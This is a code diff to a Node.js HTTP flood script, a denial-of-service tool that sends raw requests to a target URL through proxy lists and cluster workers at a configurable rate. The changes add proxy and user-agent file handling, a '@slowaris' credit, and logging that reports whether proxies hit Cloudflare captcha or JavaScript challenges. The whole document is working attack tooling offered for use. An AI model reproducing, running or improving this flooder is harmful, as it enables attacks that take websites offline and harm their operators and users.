@@ -9,11 +9,10 @@ var theJar = request_2.jar();
 const path = require("path");
 const http = require('http');
 const tls = require('tls');
+const colors = require('colors');
 const execSync = require('child_process').execSync;
 
 
-var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
-var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
 var target = process.argv[2];
 var time = process.argv[3];
 var thread = process.argv[5];
@@ -24,6 +23,20 @@ var method = process.argv[7];
 var fileName = __filename;
 var file = path.basename(fileName);
 
+
+
+try {
+    var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
+    var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
+
+} catch (err) {
+
+    if (err.code !== 'ENOENT') throw err;
+    console.log('@slowaris');
+    console.log('Check if everything is installed as it should');
+    console.log('Maybe you not have ua.txt [User-agents]');
+    process.exit();
+}
 
 process.on('uncaughtException', function() {});
 process.on('unhandledRejection', function() {});
@@ -44,14 +57,14 @@ global.logger = function() {
         var milliseconds = date.getMilliseconds();
 
         return '[' +
-        ((hour < 10) ? '0' + hour : hour) +
-        ':' +
-        ((minutes < 10) ? '0' + minutes : minutes) +
-        ':' +
-        ((seconds < 10) ? '0' + seconds : seconds) +
-        '.' +
-        ('00' + milliseconds).slice(-3) +
-        '] ';
+            ((hour < 10) ? '0' + hour : hour) +
+            ':' +
+            ((minutes < 10) ? '0' + minutes : minutes) +
+            ':' +
+            ((seconds < 10) ? '0' + seconds : seconds) +
+            '.' +
+            ('00' + milliseconds).slice(-3) +
+            '] ';
     }
 
     console.log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
@@ -62,6 +75,9 @@ process.setMaxListeners(15);
 
 
 const cluster = require('cluster');
+// const { cpus } = require('os');
+
+// // const numCPUs = cpus().length;
 const numCPUs = thread;
 
 if (cluster.isPrimary) {
@@ -105,7 +121,7 @@ if (cluster.isPrimary) {
             req.setSocketKeepAlive(true);
         });
 
-        req.on('connect', function(res, socket, head) { //open raw request
+        req.on('connect', function(res, socket, body, head) { //open raw request
             tls.authorized = true;
             tls.sync = true;
             var TlsConnection = tls.connect({
@@ -121,11 +137,14 @@ if (cluster.isPrimary) {
                 rejectUnauthorized: false,
                 socket: socket
             }, function() {
-                TlsConnection.setKeepAlive(true, 10000)
-                TlsConnection.setTimeout(10000);
+
                 for (let j = 0; j < rate; j++) {
-                    TlsConnection.write(`${method} ` + target + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nCookie: ' + proxy[1] + '\r\nOrigin: ' + target + '\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
+
+                    TlsConnection.setKeepAlive(true, 10000)
+                    TlsConnection.setTimeout(10000);
+                    TlsConnection.write(`${method} ` + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nCookie: ' + proxy[1] + '\r\nOrigin: ' + target + '\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
                 }
+
             });
 
             TlsConnection.on('disconnected', () => {
@@ -142,23 +161,42 @@ if (cluster.isPrimary) {
 
             TlsConnection.on('data', (chunk) => {
                 setTimeout(function() {
+                    TlsConnection.abort();
                     return delete TlsConnection
                 }, 10000);
             });
 
             TlsConnection.on('end', () => {
+                TlsConnection.abort();
                 TlsConnection.destroy();
             });
+
+            //console.log(res.statusCode);
+            if (res.statusCode == 403) {
+                if (body.includes("<title>Please Wait... | Cloudflare</title>")) {
+                    logger(colors.yellow("[403] Proxy get Captcha [Cloudflare]"))
+                        //clearInterval(interval);
+                }
+            } else if (res.statusCode == 503) {
+                if (body.includes("<title>Please Wait... | Cloudflare</title>")) {
+                    logger(colors.yellow("[503] Proxy get Javascript checker [UAM]"))
+                        //clearInterval(interval);
+                }
+            } else if (res.statusCode == 200) {
+                logger(colors.brightGreen("[200] Connection established"))
+            } else if (res.statusCode == 503) {
+                logger(colors.yellow("[503] It has problem with sending the request"))
+            } else if (res.statusCode == 502) {
+                logger(colors.red("[502] Bad Gateway"))
+            }
 
         }).end()
     }, 0);
 }
 
 
-
 setTimeout(() => {
     process.exit(1);
 }, time * 1000)
-
 
 logger('STARTING  :: ', target, 'FOR', time, 'MS');
